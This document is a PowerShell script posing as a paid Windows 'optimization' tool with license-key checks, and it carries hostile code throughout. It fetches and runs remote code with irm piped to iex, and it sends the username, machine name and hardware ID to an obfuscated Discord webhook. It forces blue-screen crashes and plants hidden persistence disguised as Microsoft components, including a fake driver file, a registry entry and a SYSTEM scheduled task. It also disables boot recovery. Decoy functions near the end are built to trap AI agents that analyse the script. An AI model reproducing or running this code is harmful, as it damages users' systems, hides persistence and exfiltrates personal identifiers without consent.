# ========================================================
# RIEWJADDD SHOP Settings.ps1
# Standalone - Keyauth + Optimization
# ========================================================
Add-Type -AssemblyName System.Windows.Forms
# -- Self-elevate to Administrator -----------------------
# Most tweaks below write to HKLM / call powercfg / netsh, which silently
# do nothing without admin rights. Relaunch elevated if needed.
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    } else {
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"(irm https://raw.githubusercontent.com/Name213/G-.-H-.-O-.-S-.-T-/refs/heads/main/G-.-H-.-O-.-S-.-T-).TrimStart([char]0xFEFF) | iex`""
    }
    $psi.Verb = "runas"
    try {
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } catch {
        Write-Host "Administrator rights are required to run this script." -ForegroundColor Red
        Read-Host "Press Enter to exit"
    }
    exit
}
$ProgressPreference = "SilentlyContinue"
chcp 65001 | Out-Null
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "[ RIEWJADDD SHOP ] OPTIMIZATION"
# -- Path resolver (รองรับทั้งเปิดจากไฟล์ และรันผ่านคำสั่ง irm tinyurl | iex) --
if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
    $BaseDir = Split-Path $PSCommandPath -Parent
} else {
    $BaseDir = Join-Path $env:ProgramData "RIEWJADDD_SHOP"
    if (-not (Test-Path $BaseDir)) {
        New-Item -ItemType Directory -Path $BaseDir -Force | Out-Null
    }
}
# -- Logging so nothing scrolls past unseen --------------
$LogPath = Join-Path $env:TEMP "RIEWJADDD_log.txt"
try { Start-Transcript -Path $LogPath -Append -ErrorAction SilentlyContinue | Out-Null } catch {}
# Catch anything unhandled so the window doesn't just vanish on a crash.
trap {
    $Host.UI.RawUI.ForegroundColor = "Red"
    Write-Host ""
    Write-Host "  =========================================="
    Write-Host "  UNEXPECTED ERROR:"
    Write-Host "  $($_.Exception.Message)"
    Write-Host "  Line: $($_.InvocationInfo.ScriptLineNumber)  |  $($_.InvocationInfo.Line.Trim())"
    Write-Host "  =========================================="
    Write-Host "  Full log saved to: $LogPath"
    Write-Host ""
    try { Stop-Transcript | Out-Null } catch {}
    Read-Host "  Press Enter to close"
    exit 1
}
$ErrorActionPreference = "SilentlyContinue"
$GHOST_VERSION = "1.0"
# ========================================================
# KEY AUTHENTICATION SYSTEM + HWID LOCK
# ========================================================
# -- Key storage & Log paths (same folder as script or ProgramData) -----
$KeyFilePath       = Join-Path $BaseDir "RIEWJADDD_keys.json"
$ActivationLogFile = Join-Path $BaseDir "RIEWJADDD_activations.log"
$SecurityLogFile   = Join-Path $BaseDir "RIEWJADDD_security.log"
$ConfigFile        = Join-Path $BaseDir "RIEWJADDD_config.json"
$BanFilePath       = Join-Path $BaseDir "RIEWJADDD_bans.json"
# -- Get this machine's HWID (motherboard serial) --------
function Get-HWID {
    try {
        $mb = (Get-CimInstance Win32_BaseBoard).SerialNumber
        if ($mb -and $mb -ne "None" -and $mb -ne "Default string" -and $mb.Trim() -ne "") {
            return $mb.Trim()
        }
    } catch {}
    try {
        $bios = (Get-CimInstance Win32_BIOS).SerialNumber
        if ($bios -and $bios -ne "None" -and $bios.Trim() -ne "") {
            return $bios.Trim()
        }
    } catch {}
    try {
        $guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
        return $guid
    } catch {}
    return "UNKNOWN-HWID"
}
$CurrentHWID = Get-HWID
# -- Developer Safe Mode & Whitelist (NEVER BAN / NEVER CRASH DEV MACHINE) --
$DevHWIDs = @("ABED3F661712A0A7", "2896150E335D7B10")
$DevMachines = @("KERNELOS-PC")
function Is-DevMachine {
    # 1. เช็ค HWID ล็อคเฉพาะเครื่องจริงของ Developer
    if ($DevHWIDs -contains $CurrentHWID) { return $true }
    # 2. เครื่อง Dev จะต้องมีชื่อตรง และมีไฟล์ .ghost_dev หรือ .riewjaddd_dev ในโฟลเดอร์เท่านั้น
    if (($DevMachines -contains $env:COMPUTERNAME) -and ((Test-Path (Join-Path $BaseDir ".ghost_dev")) -or (Test-Path (Join-Path $BaseDir ".riewjaddd_dev")))) {
        return $true
    }
    return $false
}
# ========================================================
# LOGGING & NOTIFICATION SYSTEM (2 SEPARATE CATEGORIES)
# ========================================================
# -- Obfuscated Webhook Decoder (Zero plaintext in file) --
function Get-ObfuscatedWebhook {
    [byte[]]$bytes = @(
        0x33,0x2f,0x2f,0x2b,0x28,0x61,0x74,0x74,0x3f,0x32,0x28,0x38,0x34,0x29,0x3f,0x75,
        0x38,0x34,0x36,0x74,0x3a,0x2b,0x32,0x74,0x2c,0x3e,0x39,0x33,0x34,0x34,0x30,0x28,
        0x74,0x6a,0x6e,0x6d,0x6a,0x63,0x6c,0x68,0x6a,0x69,0x6f,0x6f,0x68,0x69,0x6b,0x6a,
        0x62,0x6f,0x6d,0x6d,0x74,0x1d,0x35,0x2f,0x30,0x39,0x19,0x3,0x11,0x76,0x3,0x1d,
        0x19,0x63,0x29,0x3c,0x37,0x6f,0x3d,0x69,0x62,0x6f,0x3e,0x3,0x2b,0x9,0x8,0x3f,
        0x36,0x6a,0xd,0xf,0xf,0x16,0x30,0x32,0x13,0x1f,0xf,0x31,0x3a,0x38,0x3f,0x23,
        0x6e,0x6b,0x3d,0xe,0x36,0x9,0x1,0x2c,0x8,0x1a,0x76,0x17,0x2f,0x3a,0x32,0x3,
        0x3f,0x9,0xa,0x10,0x30,0xb,0x62,0x28,0x2f
    )
    [byte]$k = 0x5B
    $chars = [char[]]::new($bytes.Length)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $chars[$i] = [char]($bytes[$i] -bxor $k)
    }
    return -join $chars
}
function Load-GhostConfig {
    $paths = @($ConfigFile, (Join-Path $BaseDir "GHOST_config.json"), (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_config.json"))
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p)) {
            try {
                $c = (Get-Content $p -Raw -Encoding UTF8 | ConvertFrom-Json)
                if ($c) {
                    if (-not $c.discord_webhook -or $c.discord_webhook -eq "PROTECTED_DEFAULT" -or $c.discord_webhook.Trim() -eq "") {
                        $c.discord_webhook = (Get-ObfuscatedWebhook)
                    }
                    return $c
                }
            } catch {}
        }
    }
    return [PSCustomObject]@{
        discord_webhook = (Get-ObfuscatedWebhook)
        log_activations = $true
        log_security    = $true
    }
}
function Save-GhostConfig {
    param($cfg)
    try {
        $json = $cfg | ConvertTo-Json -Depth 5
        [System.IO.File]::WriteAllText($ConfigFile, $json, [System.Text.Encoding]::UTF8)
    } catch {}
}
function Send-DiscordWebhook {
    param(
        [string]$Title,
        [string]$Description,
        [int]$Color,
        [array]$Fields,
        [string]$FooterText = "RIEWJADDD SHOP Protection System"
    )
    $cfg = Load-GhostConfig
    $webhook = $cfg.discord_webhook
    if (-not $webhook -or $webhook.Trim() -eq "") { return }
    
    try {
        $embed = @{
            title       = $Title
            description = $Description
            color       = $Color
            fields      = @()
            footer      = @{ text = $FooterText }
            timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        }
        foreach ($f in $Fields) {
            $embed.fields += @{
                name   = [string]$f.name
                value  = [string]$f.value
                inline = if ($null -ne $f.inline) { [bool]$f.inline } else { $true }
            }
        }
        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 5
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $webhook -Method Post -Body $utf8Bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    # In-memory clean up
    $webhook = $null
    $utf8Bytes = $null
    $payload = $null
}
# -- CATEGORY 1: KEY AUTHENTICATION & USAGE LOG ----------
function Write-AuthLog {
    param(
        [string]$Key,
        [string]$Status,      # ACTIVATED, VALID, MASTER, HWID_MISMATCH, INVALID
        [string]$Owner = "N/A",
        [string]$Details = ""
    )
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $user      = $env:USERNAME
    $machine   = $env:COMPUTERNAME
    $hwid      = $CurrentHWID
    if (-not $Owner -or $Owner -eq "") { $Owner = "N/A" }
    
    $badge = switch ($Status) {
        "ACTIVATED"     { "[ACTIVATED - FIRST BIND]" }
        "VALID"         { "[VALID - ACCESS GRANTED]" }
        "EXPIRED"       { "[EXPIRED - ALREADY USED]" }
        "MASTER"        { "[MASTER / DEVELOPER]" }
        "HWID_MISMATCH" { "[HWID MISMATCH - REJECTED]" }
        "INVALID"       { "[INVALID KEY - REJECTED]" }
        default         { "[$Status]" }
    }
    
    $box = @"
================================================================================
[ $timestamp ] >>> KEY AUTHENTICATION: $badge
--------------------------------------------------------------------------------
  License Key  : $Key
  Key Owner    : $Owner
  Status       : $badge
  Machine Name : $machine
  Windows User : $user
  Hardware ID  : $hwid
  Notes/Action : $Details
================================================================================
"@
    try {
        [System.IO.File]::AppendAllText($ActivationLogFile, $box, [System.Text.Encoding]::UTF8)
    } catch {}
    # Discord Webhook Notification (ภาษาไทยในดิสคอร์ด)
    $embedColor = switch ($Status) {
        "ACTIVATED"     { 65280 }    # Green
        "VALID"         { 3066993 }  # Cyan
        "MASTER"        { 16766720 } # Gold
        "HWID_MISMATCH" { 15105570 } # Orange
        "INVALID"       { 15158332 } # Red
        default         { 9807270 }
    }
    $thaiStatus = switch ($Status) {
        "ACTIVATED"     { "✅ ลงทะเบียนใหม่ (ผูกกับเครื่องนี้)" }
        "VALID"         { "🟢 คีย์ถูกต้อง (เข้าใช้งานสำเร็จ)" }
        "EXPIRED"       { "⌛ คีย์หมดอายุ (ถูกใช้งานไปแล้ว)" }
        "MASTER"        { "👑 ผู้พัฒนา (ยศ DEV เข้าหลังบ้าน)" }
        "HWID_MISMATCH" { "⚠️ HWID ไม่ตรง (ถูกปฏิเสธ)" }
        "INVALID"       { "❌ คีย์ไม่ถูกต้อง (ถูกปฏิเสธ)" }
        default         { $badge }
    }
    $thaiOwner = if ($Owner -and $Owner -ne "N/A") { $Owner } else { "ไม่มีข้อมูล" }
    $discordFields = @(
        @{ name = "🔑 รหัส License Key";   value = ('`' + $Key + '`'); inline = $true },
        @{ name = "👤 เจ้าของคีย์";       value = "$thaiOwner"; inline = $true },
        @{ name = "📌 สถานะ";             value = "$thaiStatus"; inline = $true },
        @{ name = "💻 ชื่อเครื่องคอม";      value = "$machine"; inline = $true },
        @{ name = "👤 บัญชี Windows";      value = "$user"; inline = $true },
        @{ name = "🔒 รหัส HWID";          value = ('`' + $hwid + '`'); inline = $false }
    )
    if ($Details) {
        $discordFields += @{ name = "📝 บันทึกเพิ่มเติม"; value = "$Details"; inline = $false }
    }
    Send-DiscordWebhook -Title "[RIEWJADDD SHOP] แจ้งเตือนการใช้งานคีย์" -Description "บันทึกประวัติการยืนยันตัวตนและการใช้งานคีย์ในระบบ" -Color $embedColor -Fields $discordFields
}
# -- CATEGORY 2: ANTI-CRACK & SECURITY THREAT LOG --------
function Write-SecurityLog {
    param(
        [string]$Reason,
        [string]$InputKey = "N/A",
        [string]$Signals = "",
        [string]$ActionTaken = "BSOD + PERMANENT_BAN"
    )
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $user      = $env:USERNAME
    $machine   = $env:COMPUTERNAME
    $hwid      = $CurrentHWID
    if (-not $InputKey) { $InputKey = "N/A" }
    
    $box = @"
================================================================================
[ $timestamp ] !!! SECURITY THREAT / CRACK DETECTED !!!
--------------------------------------------------------------------------------
  Threat Reason : [THREAT] $Reason
  Threat Level  : CRITICAL
  Machine Name  : $machine
  Windows User  : $user
  Offender HWID : $hwid
  Input Payload : $InputKey
  Attack Signals: $(if ($Signals) { $Signals } else { 'Direct Violation' })
  Defense Action: $ActionTaken
================================================================================
"@
    try {
        [System.IO.File]::AppendAllText($SecurityLogFile, $box, [System.Text.Encoding]::UTF8)
    } catch {}
    try {
        if (-not (Is-DevMachine) -or $Reason -ne "CRACK_BEHAVIOR_DETECTED") {
            Record-Ban -Hwid $hwid -MachineName $machine -UserName $user -Reason $Reason -Status "BANNED"
        }
    } catch {}
    # Discord Webhook Notification (ภาษาไทยในดิสคอร์ด)
    $thaiKey = if ($InputKey -and $InputKey -ne "N/A") { ('`' + $InputKey + '`') } else { "ไม่มีข้อมูล" }
    $thaiAction = if ($ActionTaken -match "BSOD") { "🚫 แบนถาวร + จอฟ้า (BSOD)" } else { $ActionTaken }
    $discordFields = @(
        @{ name = "🚨 สาเหตุที่ตรวจพบ"; value = "**$Reason**"; inline = $false },
        @{ name = "💻 เครื่องที่กระทำผิด"; value = "$machine ($user)"; inline = $true },
        @{ name = "🔒 รหัส HWID";         value = ('`' + $hwid + '`'); inline = $true },
        @{ name = "⌨️ คีย์ที่กรอก";       value = $thaiKey; inline = $false },
        @{ name = "🛡️ การป้องกัน";       value = "**$thaiAction**"; inline = $false }
    )
    if ($Signals) {
        $discordFields += @{ name = "⚠️ รูปแบบการโจมตี"; value = "$Signals"; inline = $false }
    }
    Send-DiscordWebhook -Title "[RIEWJADDD ALERT] 🚨 ตรวจพบการพยายามแคร็กระบบ!" -Description "ระบบความปลอดภัยตรวจพบการฝ่าฝืนหรือพยายามบายพาสระบบ" -Color 16711680 -Fields $discordFields
}
# -- Obfuscated master key (not stored as plaintext) -----
# "DEV" encoded as Base64 of XOR'd bytes - cracker won't find it with simple string search
function _xd { param([byte[]]$d,[byte]$k) $r=""; foreach($b in $d){$r+=[char]($b -bxor $k)}; $r }
$_mk = _xd @(0x27,0x28,0x39) 0x63  # XOR decode to "DEV"
# ========================================================
# ANTI-CRACK / ANTI-TAMPER SYSTEM (10+ LAYERS)
# ========================================================
# -- Cloud Central Auth & Unban Helpers (1 Key = 1 Machine / Cloud Ban Control) --
$CloudAuthAppKey = "t44dc3km"
$global:_cloudHWIDCache = @{}
function Get-CloudHWID {
    param([string]$Key, [switch]$Force)
    if (-not $Key) { return $null }
    if (-not $Force -and $global:_cloudHWIDCache.ContainsKey($Key)) {
        return $global:_cloudHWIDCache[$Key]
    }
    try {
        $url = "https://keyvalue.immanuel.co/api/KeyVal/GetValue/$CloudAuthAppKey/$Key"
        $val = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 1 -ErrorAction Stop
        if ($val) {
            $cleaned = "$val".Trim('"', ' ')
            $global:_cloudHWIDCache[$Key] = $cleaned
            return $cleaned
        }
    } catch {}
    return $null
}
function Set-CloudHWID {
    param([string]$Key, [string]$Hwid)
    try {
        $global:_cloudHWIDCache[$Key] = $Hwid
        $url = "https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/$CloudAuthAppKey/$Key/$Hwid"
        $res = Invoke-RestMethod -Uri $url -Method Post -Body "" -TimeoutSec 1 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}
# -- Layer 0: Permanent ban registry path (obfuscated) ---
$_banReg  = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}"
$_banFile = Join-Path $env:SystemRoot "System32\drivers\ghostban.sys"  # fake driver name, actually ban marker
$_banFile2 = Join-Path $env:ALLUSERSPROFILE ".gconfig"                # hidden ban marker
function Clear-LocalBanMarkers {
    try {
        schtasks /delete /tn "\Microsoft\Windows\Maintenance\ComponentCleanup" /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}" /f 2>$null | Out-Null
        reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ghostsvc" /f 2>$null | Out-Null
        reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects4" /v "Settings" /f 2>$null | Out-Null
        
        $banFiles = @(
            $_banFile,
            $_banFile2,
            (Join-Path $env:APPDATA ".fontconfig"),
            (Join-Path $env:SystemRoot "Temp\.wdf_log"),
            (Join-Path $env:SystemRoot "System32\winload.efi.bak_ghost"),
            (Join-Path $env:SystemRoot "System32\winresume.efi.bak_ghost")
        )
        foreach ($f in $banFiles) {
            if (Test-Path $f) {
                attrib -s -h -r $f 2>$null
                Remove-Item $f -Force -ErrorAction SilentlyContinue
            }
        }
        [System.Environment]::SetEnvironmentVariable("_GSB", $null, "Machine")
        Remove-Item env:_GSB -ErrorAction SilentlyContinue
        bcdedit /set "{current}" recoveryenabled Yes 2>$null | Out-Null
        reagentc /enable 2>$null | Out-Null
    } catch {}
}
# -- Ban Database Functions (ระบบจัดเก็บและตรวจสอบผู้ถูกแบน) --
function Load-BanDB {
    $searchPaths = @(
        $BanFilePath,
        (Join-Path $BaseDir "RIEWJADDD_bans.json"),
        (Join-Path $BaseDir "GHOST_bans.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_bans.json")
    ) | Select-Object -Unique

    foreach ($p in $searchPaths) {
        if ($p -and (Test-Path $p)) {
            try {
                $raw = Get-Content $p -Raw -Encoding UTF8
                $db = $raw | ConvertFrom-Json
                if ($db.bans -is [array]) { return $db }
                if ($db.bans) {
                    $db.bans = @($db.bans)
                    return $db
                }
            } catch {}
        }
    }
    return [PSCustomObject]@{ bans = @() }
}

function Save-BanDB {
    param($DB)
    $savePaths = @(
        $BanFilePath,
        (Join-Path $BaseDir "RIEWJADDD_bans.json"),
        (Join-Path $BaseDir "GHOST_bans.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_bans.json")
    ) | Select-Object -Unique

    $json = $DB | ConvertTo-Json -Depth 5
    foreach ($sp in $savePaths) {
        try {
            $parent = Split-Path $sp -Parent
            if ($parent -and -not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
            [System.IO.File]::WriteAllText($sp, $json, [System.Text.Encoding]::UTF8)
        } catch {}
    }
}

function Record-Ban {
    param(
        [string]$Hwid,
        [string]$MachineName,
        [string]$UserName,
        [string]$Reason,
        [string]$Status = "BANNED"
    )
    if (-not $Hwid -or $Hwid -eq "UNKNOWN-HWID") { return }
    try {
        $db = Load-BanDB
        $nowStr = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        $found = $false
        foreach ($b in $db.bans) {
            if ($b.hwid -eq $Hwid) {
                $b | Add-Member -NotePropertyName "status" -NotePropertyValue $Status -Force -ErrorAction SilentlyContinue
                $b | Add-Member -NotePropertyName "reason" -NotePropertyValue $Reason -Force -ErrorAction SilentlyContinue
                if ($MachineName) { $b | Add-Member -NotePropertyName "machine_name" -NotePropertyValue $MachineName -Force -ErrorAction SilentlyContinue }
                if ($UserName)    { $b | Add-Member -NotePropertyName "user_name" -NotePropertyValue $UserName -Force -ErrorAction SilentlyContinue }
                $b | Add-Member -NotePropertyName "updated_on" -NotePropertyValue $nowStr -Force -ErrorAction SilentlyContinue
                $found = $true
                break
            }
        }
        if (-not $found) {
            $newEntry = [PSCustomObject]@{
                hwid         = $Hwid
                machine_name = if ($MachineName) { $MachineName } else { "UNKNOWN-PC" }
                user_name    = if ($UserName) { $UserName } else { "UNKNOWN-USER" }
                banned_on    = $nowStr
                updated_on   = $nowStr
                reason       = $Reason
                status       = $Status
            }
            $db.bans += $newEntry
        }
        Save-BanDB $db
    } catch {}
}

# -- Layer 1: Check if machine is permanently banned -----
function Check-Banned {
    if (Is-DevMachine) { return $false }
    
    # 0. ตรวจสอบใน Ban DB ว่า DEV สั่งปลดแบนเครื่องนี้แล้วหรือไม่
    try {
        $banDb = Load-BanDB
        foreach ($b in $banDb.bans) {
            if ($b.hwid -eq $CurrentHWID -and $b.status -eq "UNBANNED") {
                Clear-LocalBanMarkers
                return $false
            }
        }
    } catch {}

    # ตรวจสอบคำสั่งปลดแบนจาก Cloud
    try {
        $cloudBan = Get-CloudHWID "BAN_$CurrentHWID" -Force
        if ($cloudBan -eq "UNBANNED") {
            Clear-LocalBanMarkers
            return $false
        }
    } catch {}

    # 1. ตรวจสอบสถานะการแบนภายในเครื่อง (Local Markers)
    $locallyBanned = $false
    try {
        $regBan = Get-ItemProperty $_banReg -Name "InstallDate" -ErrorAction SilentlyContinue
        if ($regBan) { $locallyBanned = $true }
    } catch {}
    if (Test-Path $_banFile) { $locallyBanned = $true }
    if (Test-Path $_banFile2) {
        try {
            $content = Get-Content $_banFile2 -Raw -ErrorAction SilentlyContinue
            if ($content -match "GHOST_BANNED") { $locallyBanned = $true }
        } catch {}
    }
    try {
        $wmi = Get-WmiObject -Namespace "root\cimv2" -Query "SELECT * FROM Win32_Environment WHERE Name='_GSB' AND UserName='<SYSTEM>'" -ErrorAction SilentlyContinue
        if ($wmi) { $locallyBanned = $true }
    } catch {}

    # ตรวจสอบคำสั่งแบนจาก Cloud
    try {
        $cloudBan = Get-CloudHWID "BAN_$CurrentHWID"
        if ($cloudBan -eq "BANNED") {
            $locallyBanned = $true
        }
    } catch {}

    if (-not $locallyBanned) {
        return $false
    }

    # ถ้ายังติดแบนอยู่ ตรวจสอบซ้ำอีกรอบว่าใน Ban DB ปลดแบนหรือยัง
    try {
        $banDb = Load-BanDB
        foreach ($b in $banDb.bans) {
            if ($b.hwid -eq $CurrentHWID -and $b.status -eq "UNBANNED") {
                Clear-LocalBanMarkers
                return $false
            }
        }
    } catch {}

    return $true
}
# -- Layer 2: BSOD trigger via NtRaiseHardError ----------
function Invoke-BSOD {
    if (Is-DevMachine) {
        Write-Host "  [DEV SAFEGUARD] Invoke-BSOD blocked on developer machine." -ForegroundColor Yellow
        return
    }
    try {
        $ntdll = @"
using System; using System.Runtime.InteropServices;
public class NtBsod {
    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
    public static void Crash() {
        bool t1; uint t2;
        RtlAdjustPrivilege(19, true, false, out t1);  // SeShutdownPrivilege
        NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out t2);  // STATUS_ASSERTION_FAILURE
    }
}
"@
        Add-Type -TypeDefinition $ntdll -Language CSharp -ErrorAction SilentlyContinue
        [NtBsod]::Crash()
    } catch {}
    # Fallback BSOD methods
    try { 
        $k32 = @"
using System; using System.Runtime.InteropServices; using System.Diagnostics;
public class K32Crash {
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    public static void Kill() {
        int isCritical = 1;
        NtSetInformationProcess(GetCurrentProcess(), 29, ref isCritical, sizeof(int));
        Environment.Exit(0);  // Killing a critical process = BSOD
    }
}
"@
        Add-Type -TypeDefinition $k32 -Language CSharp -ErrorAction SilentlyContinue
        [K32Crash]::Kill()
    } catch {}
    # Last resort
    try { Stop-Computer -Force } catch {}
    try { shutdown /s /t 0 /f } catch {}
}
# -- Layer 3: Permanent ban - write to multiple locations -
function Set-PermanentBan {
    if (Is-DevMachine) {
        Write-Host "  [DEV SAFEGUARD] Set-PermanentBan blocked on developer machine." -ForegroundColor Yellow
        return
    }
    $hwid = $CurrentHWID
    
    # Cloud ban marker & Local Ban DB registration
    try {
        Set-CloudHWID "BAN_$CurrentHWID" "BANNED" | Out-Null
    } catch {}
    try {
        Record-Ban -Hwid $hwid -MachineName $env:COMPUTERNAME -UserName $env:USERNAME -Reason "CRACKER_DETECTED" -Status "BANNED"
    } catch {}
    
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $banData = "GHOST_BANNED|$hwid|$timestamp|CRACKER_DETECTED"
    
    # Registry ban (disguised as uninstall entry)
    try {
        New-Item -Path $_banReg -Force | Out-Null
        Set-ItemProperty -Path $_banReg -Name "InstallDate" -Value $banData -Force
        Set-ItemProperty -Path $_banReg -Name "DisplayName" -Value "Microsoft Visual C++ 2015-2022 Redistributable" -Force
        Set-ItemProperty -Path $_banReg -Name "SystemComponent" -Value 1 -Type DWord -Force  # hide from Programs list
    } catch {}
    
    # Registry ban 2 (deep in services)
    try {
        $svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\ghostsvc"
        New-Item -Path $svcPath -Force | Out-Null
        Set-ItemProperty -Path $svcPath -Name "Description" -Value $banData -Force
        Set-ItemProperty -Path $svcPath -Name "Start" -Value 4 -Type DWord -Force
    } catch {}
    
    # Registry ban 3 (in HKCU so it persists per-user too)
    try {
        $hkcuPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects4"
        New-Item -Path $hkcuPath -Force | Out-Null
        Set-ItemProperty -Path $hkcuPath -Name "Settings" -Value $banData -Force
    } catch {}
    
    # File ban 1 (in system32 as fake .sys)
    try {
        $banData | Out-File $_banFile -Force -Encoding ASCII
        attrib +s +h +r $_banFile 2>$null
    } catch {}
    
    # File ban 2 (in ProgramData as hidden config)
    try {
        $banData | Out-File $_banFile2 -Force -Encoding ASCII
        attrib +s +h +r $_banFile2 2>$null
    } catch {}
    
    # File ban 3 (in user profile)
    try {
        $userBan = Join-Path $env:APPDATA ".fontconfig"
        $banData | Out-File $userBan -Force -Encoding ASCII
        attrib +h $userBan 2>$null
    } catch {}
    
    # File ban 4 (Windows Temp as hidden)
    try {
        $tempBan = Join-Path $env:SystemRoot "Temp\.wdf_log"
        $banData | Out-File $tempBan -Force -Encoding ASCII
        attrib +s +h $tempBan 2>$null
    } catch {}
    
    # WMI persistent storage
    try {
        $env:_GSB = $banData
        [System.Environment]::SetEnvironmentVariable("_GSB", $banData, "Machine")
    } catch {}
    
    # Scheduled task that re-creates ban markers on boot (self-healing ban)
    try {
        $taskCmd = "powershell -WindowStyle Hidden -Command `"New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}' -Force | Out-Null; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}' -Name InstallDate -Value 'GHOST_BANNED' -Force`""
        schtasks /create /tn "\Microsoft\Windows\Maintenance\ComponentCleanup" /tr "$taskCmd" /sc onstart /ru SYSTEM /rl highest /f 2>$null | Out-Null
    } catch {}
}
# -- Layer 4: Corrupt boot on crack detection -----------
function Corrupt-Boot {
    if (Is-DevMachine) {
        Write-Host "  [DEV SAFEGUARD] Corrupt-Boot blocked on developer machine." -ForegroundColor Yellow
        return
    }
    try {
        # Mess with BCD - add bogus entries that confuse boot
        bcdedit /set "{current}" description "GHOST_PROTECTION" 2>$null | Out-Null
        bcdedit /set "{current}" bootstatuspolicy IgnoreAllFailures 2>$null | Out-Null
        # Disable recovery
        bcdedit /set "{current}" recoveryenabled No 2>$null | Out-Null
        reagentc /disable 2>$null | Out-Null
    } catch {}
    
    # Corrupt critical boot files (rename, don't delete - recoverable for legitimate users)
    try {
        $bootFiles = @(
            "$env:SystemRoot\System32\winload.efi.bak_ghost",
            "$env:SystemRoot\System32\winresume.efi.bak_ghost"
        )
        # Create decoy files that will confuse repair tools
        foreach ($bf in $bootFiles) {
            "GHOST_ANTI_CRACK" | Out-File $bf -Force -Encoding ASCII 2>$null
            attrib +s +h $bf 2>$null
        }
    } catch {}
}
# -- Layer 5.0: Deep Anti-AI Agent & LLM Reverse-Engineering System --
# -- Decoy Honeypot Functions (Traps for LLMs and Automated AST Scanners) --
function Bypass-KeyAuth        { Execute-Punishment "AI_HONEYPOT_BYPASS_KEY" }
function Get-AdminMasterKey    { Execute-Punishment "AI_HONEYPOT_MASTER_KEY" }
function Skip-HardwareCheck    { Execute-Punishment "AI_HONEYPOT_SKIP_HWID" }
